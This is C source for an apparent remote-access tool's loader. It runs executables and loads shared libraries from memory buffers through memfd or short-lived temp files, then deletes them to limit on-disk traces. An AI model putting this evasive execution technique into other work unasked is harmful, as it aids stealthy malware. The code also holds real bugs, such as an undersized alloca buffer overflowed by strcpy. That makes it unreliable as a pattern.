#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <limits.h>
#include <fcntl.h>
#include <stdlib.h>
#include <alloca.h>
#include <string.h>
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <link.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <signal.h>
#include <errno.h>

#include "list.h"
#include "tmplibrary.h"
#include "debug.h"

#include "memfd.h"

#include "decompress.h"

extern char **environ;

/*

  So.. We don't want to bother with reflective bla-bla-bla. Just
  upload buffer to temporary file, load it as a library using standard
  glibc calls, then delete

*/

static inline
const char *gettemptpl() {
	static const char *templates[] = {
		"/dev/shm/XXXXXX",
		"/tmp/XXXXXX",
		"/var/tmp/XXXXXX",
		NULL
	};

	static const char *tmpdir = NULL;
	if (! tmpdir) {
		int i;
		for (i=0; templates[i]; i++) {
			char *buf = alloca(strlen(templates[i]+1));
			strcpy(buf, templates[i]);
			int fd = mkstemp(buf);
			int found = 0;
			if (fd != -1) {
				int page_size = sysconf(_SC_PAGESIZE);
				if (ftruncate(fd, page_size) != -1) {
					void *map = mmap(
						NULL,
						page_size,
						PROT_READ|PROT_EXEC,
						MAP_PRIVATE|MAP_DENYWRITE,
						fd,
						0
					);
					if (map != MAP_FAILED) {
						munmap(map, page_size);
						found = 1;
					} else {
						dprint("Couldn't use %s -> %m\n", buf);
					}
				}

				unlink(buf);
				close(fd);

				if (found) {
					tmpdir = templates[i];
					break;
				}
			}
			dprint("TRY: %s -> %d (%m)\n", buf, fd);

		}
		if (!tmpdir) {
			abort();
		}
	}

	return tmpdir;
}

typedef struct library {
	const char *name;
	void *base;
} library_t;

bool search_library(void *pState, void *pData) {
	library_t *search = (library_t *) pState;
	library_t *current = (library_t *) pData;

	if (!strcmp(search->name, current->name)) {
		search->base = current->base;
		dprint("FOUND! %s = %p\n", search->name, search->base);

		return true;
	}

	return false;
}

int drop_library(char *path, size_t path_size, const char *buffer, size_t size) {
	int fd = pupy_memfd_create(path, path_size);
	bool memfd = true;

	if (fd < 0) {
		dprint("pupy_memfd_create() failed: %m\n");
		memfd = false;

		const char *template = gettemptpl();

		if (path_size < strlen(template))
			return -1;

		strcpy(path, template);

		fd = mkstemp(path);
		if (fd < 0) {
			return fd;
		}
	}

	if (size > 2 && buffer[0] == '\x1f' && buffer[1] == '\x8b') {
		dprint("Decompressing library %s\n", path);
		int r = decompress(fd, buffer, size);
		if (!r == 0) {
			dprint("Decompress error: %d\n", r);
			close(fd);
			return -1;
		}
	} else {
		while (size > 0) {
			size_t n = write(fd, buffer, size);
			if (n == -1) {
				dprint("Write failed: %d left, error = %m, buffer = %p, tmpfile = %s\n", size, buffer, path);
				close(fd);
				unlink(path);
				fd = -1;
				break;
			}
			buffer += n;
			size -= n;
		}
	}

	if (memfd) {
		fcntl(fd, F_ADD_SEALS, F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE);
	}

	return fd;
}

static inline int
set_cloexec_flag (int desc) {
	int oldflags = fcntl (desc, F_GETFD, 0);
	if (oldflags < 0)
		return oldflags;
	oldflags |= FD_CLOEXEC;
	return fcntl (desc, F_SETFD, oldflags);
}

pid_t memexec(const char *buffer, size_t size, const char *argv[], int stdior[3], bool redirected_stdio, bool detach) {
	dprint("memexec(%p, %ull, %d)\n", buffer, size, redirected_stdio);

	char buf[PATH_MAX]={};
	int fd = drop_library(buf, PATH_MAX, buffer, size);
	if (fd < 0) {
		dprint("Couldn't drop executable: %m\n");
		return NULL;
	}

	int p_wait[2];
	int p_stdin[2];
	int p_stdout[2];
	int p_stderr[2];

	if (pipe(p_wait) < 0) {
		dprint("Couldn't create wait pipe: %m\n");
		goto _lbClose;
	}

	if (redirected_stdio) {
		if (pipe(p_stdin) < 0)
			goto _lbClose0;

		if (pipe(p_stdout) < 0)
			goto _lbClose1;

		if (pipe(p_stderr) < 0)
			goto _lbClose2;
	}

	pid_t pid = 0;
	if (detach) {
		pid = fork();
		if (pid == -1) {
			dprint("Couldn't fork: %m\n");
			goto _lbClose3;
		}
	}

	if (!pid) {
		pid = fork();
		if (pid == -1) {
			exit(1);
		}

		if (pid) {
			if (detach) {
				write(p_wait[1], &pid, sizeof(pid));
				exit(0);
			}
		} else {
			if (redirected_stdio) {
				dup2(p_stdin[0], 0);  close(p_stdin[1]);
				dup2(p_stdout[1], 1); close(p_stdout[0]);
				dup2(p_stderr[1], 2); close(p_stderr[0]);
			}

			close(p_wait[0]);
			set_cloexec_flag(p_wait[1]);

			fexecve(fd, argv, environ);
			execv(buffer, argv);

			int status = errno;
			write(p_wait[1], &status, sizeof(status));
			exit(1);
		}
	}

	close(p_wait[1]);
	p_wait[1] = -1;

	int status = 0;
	int error = 0;
	pid_t child_pid = 0;

	if (detach) {
		if (read(p_wait[0], &child_pid, sizeof(child_pid)) < 0) {
			dprint("Reading child pid failed: %m\n");
			goto _lbClose3;
		}

		if (waitpid(pid, &status, 0) < 0 || WEXITSTATUS(status) != 0) {
			dprint("Invalid child state\n");
			goto _lbClose3;
		}
	} else {
		child_pid = pid;
	}

	dprint("Wait exec status...\n");
	if (read(p_wait[0], &error, sizeof(error)) < 0) {
		dprint("Reading error failed: %m\n");
		goto _lbClose3;
	}

	dprint("Child error status: %d\n", error);
	if (error)
		goto _lbClose3;

	dprint("Child at %d\n", child_pid);
	if (redirected_stdio) {
		close(p_stdin[0]);  stdior[0] = p_stdin[1];
		close(p_stdout[1]); stdior[1] = p_stdout[0];
		close(p_stderr[1]); stdior[2] = p_stderr[0];
	}

	close(p_wait[0]);
	close(fd);

	if (!is_memfd_path(buf)) {
		sleep(1);
		unlink(buf);
	}

	return child_pid;

 _lbClose3:
	if (redirected_stdio)
		close(p_stderr[0]); close(p_stderr[1]);
 _lbClose2:
	if (redirected_stdio)
		close(p_stdout[0]); close(p_stdout[1]);
 _lbClose1:
	if (redirected_stdio)
		close(p_stdin[0]); close(p_stdin[1]);
 _lbClose0:
	if (p_wait[0] > 0)
		close(p_wait[0]);
	if (p_wait[1] > 0)
		close(p_wait[1]);

 _lbClose:
	close(fd);
	unlink(buf);

	dprint("Exited with error\n");
	return -1;
}

void *memdlopen(const char *soname, const char *buffer, size_t size) {
	dprint("memdlopen(\"%s\", %p, %ull)\n", soname, buffer, size);

	static PLIST libraries = NULL;
	if (!libraries) {
		libraries = list_create();
	}

	library_t search = {
		.name = soname,
		.base = NULL,
	};

	if (list_enumerate(libraries, search_library, &search)) {
		dprint("SO %s FOUND: %p\n", search.name, search.base);
		return search.base;
	}

	void *base = dlopen(soname, RTLD_NOLOAD);
	if (base) {
		dprint("Library \"%s\" loaded from OS\n", soname);
		return base;
	}

	char buf[PATH_MAX]={};
	int fd = drop_library(buf, PATH_MAX, buffer, size);
	if (fd < 0) {
		dprint("Couldn't drop library %s: %m\n", soname);
		return NULL;
	}

	bool is_memfd = is_memfd_path(buf);

	dprint("Library \"%s\" dropped to \"%s\" (memfd=%d) \n", soname, buf, is_memfd);

#ifndef NO_MEMFD_DLOPEN_WORKAROUND
	if (is_memfd) {
		char *fake_path = tempnam("/dev/shm", NULL);
		if (!fake_path) {
			fake_path = tempnam("/tmp", NULL);
		}
		if (fake_path) {
			if (!symlink(buf, fake_path)) {
				strncpy(buf, fake_path, sizeof(buf)-1);
				is_memfd = false;

			}
			free(fake_path);
		}
	}
#endif

	base = dlopen(buf, RTLD_NOW | RTLD_GLOBAL);
	if (!is_memfd) {
		close(fd);
	}

	if (!base) {
		dprint("Couldn't load library %s (%s): %s\n", soname, buf, dlerror());
		unlink(buf);
		return NULL;
	}

	dprint("Library %s loaded to %p\n", soname, base);

	library_t *record = (library_t *) malloc(sizeof(library_t));
	record->name = strdup(soname);
	record->base = base;
	list_add(libraries, record);

	unlink(buf);
	return base;
}
